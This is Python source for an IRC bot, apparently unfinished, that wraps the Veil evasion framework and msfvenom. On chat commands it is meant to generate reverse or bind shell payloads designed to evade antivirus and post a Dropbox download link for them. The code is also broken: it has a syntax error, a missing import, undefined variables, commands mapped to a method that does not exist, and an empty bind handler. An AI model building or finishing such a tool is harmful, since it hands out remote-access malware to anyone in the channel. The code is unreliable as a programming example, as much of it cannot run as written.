#!/usr/bin/env python
'''
--------------------
@author: Moloch
@copyright: GPLv3
@version: 0.1
--------------------
'''


import os
import sys
import time
import logging
import sqlite3
import ConfigParser

from models import dbsession, create_tables, Share, DBFILE_NAME
from argparse import ArgumentParser
from twisted.application import internet
from twisted.words.protocols import irc
from twisted.internet import reactor, protocol

# Veil imports
from modules.common import controller
from modules.common import messages
from modules.common import supportfiles
from config import veil


### Channel
class ChannelSettings(object):

    is_muted = False

    def __init__(self, name, password=None, ignore=False):
        if name[0] == '&' or ignore:
            self.name = name
        else: 
            self.name = "#" + name
        if password is None or password.lower() == '__none__':
            self.password = None
        else:
            self.password = password

    def __eq__(self, other):
        return self.name == str(other)

    def __ne__(self, other):
        return not self == other

    def __str__(self):
        return self.name

### Bot
class Veilbot(irc.IRCClient):
    '''
    IRC Bot
    '''

    nickname = "veil"
    realname = "Veilbot"
    channels = {}
    is_muted = False
    defaults = {
        'level': 'debug',
        'nickname': "veil",
        'realname': "Veilbot",
    }
    bindShellParser = ArgumentParser()

    def initialize(self):
        ''' 
        Because twisted is fucking stupid and won't let you use super/init 
        '''
        self.public_commands = {
            "!help": self.help,
            "!mute": self.muteBot,
            "!stfu": self.muteBot,

            # Actual commands
            "!bind": self.addShare,
            "!reverse": self.addShare,
            "!history": self.history,
        }
        # Command parsers
        reverseShellParser = argparse.ArgumentParser()
        reverseShellParser.add_argument('--lhost', '-h',
            dest='lhost'
            required=True,
        )
        reverseShellParser.add_argument('--lport', '-p',
            dest='lport',
            default="4444",
        )
        bindShellParser = argparse.ArgumentParser()
        bindShellParser.add_argument('--lport', '-p',
            dest='lport',
            default="4444",
        )

    def __dbinit__(self):
        ''' Initializes the SQLite database '''
        logging.info("Initializing SQLite db ...")
        if not os.path.exists(DBFILE_NAME):
            logging.info("Creating SQLite tables")
            dbConn = sqlite3.connect(DBFILE_NAME)
            dbConn.close()
            create_tables()

    def config(self, filename="config/veilbot.cfg"):
        ''' Load settings from config file '''
        logging.info('Loading config from: %s' % filename)
        config = ConfigParser.SafeConfigParser(self.defaults)
        config.readfp(open(filename, 'r'))
        self.__logging__(config)
        self.__system__(config)
        self.__channels__(filename)

    def __logging__(self, config):
        ''' Configure logging module '''
        logLevel = config.get("Logging", 'level')
        if logLevel.lower() == 'debug':
            logging.getLogger().setLevel(logging.DEBUG)
        elif logLevel.lower().startswith('warn'):
            logging.getLogger().setLevel(logging.WARNING)
        elif logLevel.lower() == 'error':
            logging.getLogger().setLevel(logging.ERROR)
        elif logLevel.lower() == 'critical':
            logging.getLogger().setLevel(logging.CRITICAL)
        else:
            logging.getLogger().setLevel(logging.INFO)

    def __system__(self, config):
        ''' Configure system settings '''
        self.nickname = config.get("System", 'nickname')
        logging.info('Config system bot nickname (%s)' % self.nickname)
        self.realname = config.get("System", 'realname')
        logging.info('Config system bot realname (%s)' % self.realname)

    def __channels__(self, filename):
        ''' Read channels to join from config file '''
        config = ConfigParser.SafeConfigParser()
        config.readfp(open(filename, 'r'))
        self.channel_pairs = config.items("Channels")

    def connectionMade(self):
        ''' When we make a succesful connection to a server '''
        irc.IRCClient.connectionMade(self)

    def connectionLost(self, reason):
        ''' Auto-reconnect on dropped connections '''
        irc.IRCClient.connectionLost(self, reason)
        logging.warn("Disconnected from server: %s" % str(reason))

    def signedOn(self):
        ''' Called when bot has succesfully signed on to server '''
        self.__dbinit__()
        if not 0 < len(self.channel_pairs):
            logging.warning("No channels to join.")
        for key_pair in self.channel_pairs:
            channel = ChannelSettings(key_pair[0], key_pair[1])
            self.channels[channel.name] = channel
            if channel.password is None:
                self.join(channel.name)
            else:
                self.join(channel.name, channel.password)

    def joined(self, channel):
        ''' Called when the bot joins the channel '''
        logging.info("Joined channel %s" % channel)
        self.display(self.nickname, channel, "My name is %s, I have come to destroy you." % self.nickname)

    def alterCollidedNick(self, nickname):
        ''' Avoids name collisions '''
        logging.info("Nickname collision; chaned to: " + nickname + '^')
        return nickname + '^'

    def privmsg(self, user, channel, msg):
        ''' This will get called when the bot receives a message '''
        user = user.split('!', 1)[0].lower()
        if channel == self.nickname:
            logging.debug("Private message received; response channel is '%s'" % (user,))
            channel = user
        if msg.startswith("!"):
            self.parseCommand(user, channel, msg)
        else:
            logging.debug("[Message]: <User: %s> <Channel: %s> <Msg: %s>" % (user, channel, msg))

    def parseCommand(self, user, channel, msg):
        ''' Call whatever function corisponds to the command '''
        command = msg.split(" ")[0].lower()
        msg = ' '.join(msg.split(' ')[1:])
        if command in self.public_commands:
            logging.debug("[Command]: <User: %s> <Channel: %s> <Msg: %s>" % (user, channel, msg))
            self.public_commands[command](user, channel, msg)

    def muteBot(self, user, channel, msg):
        ''' Toggle mute on/off '''
        channel_settings = self.channels.get(channel, None)
        if channel_settings is not None:
            if channel_settings.is_muted:
                channel_settings.is_muted = False
                self.display(user, channel, "Mute: OFF - Responses will be public")
            else:
                self.display(user, channel, "Mute: ON - Responses will be private")
                channel_settings.is_muted = True
        else:
            self.display(user, channel, "Cannot mute this channel.")

    def display(self, user, channel, message, whisper=False):
        ''' Intelligently wraps msg, based on mute setting '''
        channel_settings = self.channels.get(channel, None)
        if whisper or (channel_settings is not None and channel_settings.is_muted):
            display_channel = user
        else:
            display_channel = channel
        self.msg(display_channel, message.encode('ascii', 'ignore'))

    def userJoined(self, user, channel):
        ''' New user joined the channel '''
        if User.by_nick(nick) is None:
            user = User(nick=user)
            dbsession.add(user)
            dbsession.flush()

    # Actual commands
    def bind(self, user, channel, msg):
        ''' Create a bind shell '''
        pass

    def reverse(self, user, channel, msg):
        ''' Create a reverse shell '''
        args = reverseShellParser.parse_args(msg)
        fpath = self.__generate__(args)
        url = self.__dropbox__(fpath)
        self.display(user, channel, "Shell Download: %s" % (url,))
    
    def __generate__(self, args): 
        ''' Gerenate shell with args '''
        controller = controller.Controller()
        options = {}
        if args.c:
            options['required_options'] = {}
            for option in args.c:
                name,value = option.split("=")
                options['required_options'][name] = [value, ""]
        # pull out any msfvenom payloads/options
        if args.msfpayload:
            if args.msfoptions:
                options['msfvenom'] = [args.msfpayload, args.msfoptions]
            else:
                options['msfvenom'] = [args.msfpayload, None]
        # manually set the payload
        controller.SetPayload(args.l, args.p, options)
        outName = controller.OutputMenu(
            controller.payload, 
            controller.GeneratePayload(), 
            showTitle=False, 
            interactive=False, 
            OutputBaseChoice=args.o
        )
        return outName

    def __dropbox__(self, fpath):
        ''' Get public dropbox link '''
        # Copy file to dropbox
        return DROPBOX_URI + fname

    def history(self, nick, channel, msg):
        ''' Retrieve a user's history '''
        user = User.by_nick(user)

    def help(self, nick, channel, msg):
        ''' Displays a helpful messages '''
        self.display(user, channel, " > Commands: Veilbot ")
        self.display(user, channel, "-------------------------------------")
        self.display(user, channel, "    !bind: Create a bind shell ")
        self.display(user, channel, " !reverse: Create a reverse shell")
        self.display(user, channel, " !history: View you previously generated shells")


### Factory
class VeilbotFactory(protocol.ClientFactory):
    '''
    Twisted IRC bot factory
    '''

    def buildProtocol(self, addr):
        ''' Creates factory '''
        bot = Veilbot()
        bot.initialize()
        bot.config(self.configFilename)
        logging.info("Veilbot IRC Bot Starting...")
        bot.factory = self
        return bot

    def clientConnectionLost(self, connector, reason):
        ''' If we get disconnected, reconnect to server. '''
        connector.connect()

    def clientConnectionFailed(self, connector, reason):
        ''' When connection fails '''
        logging.warn("Connection failed: " + str(reason))
        reactor.stop()

### Main
if __name__ == '__main__':
    logging.basicConfig(
        format = '\r\033[1m[%(levelname)s]\033[0m %(asctime)s - %(message)s', 
        level=logging.INFO
    )
    factory = VeilbotFactory()
    reactor.run()
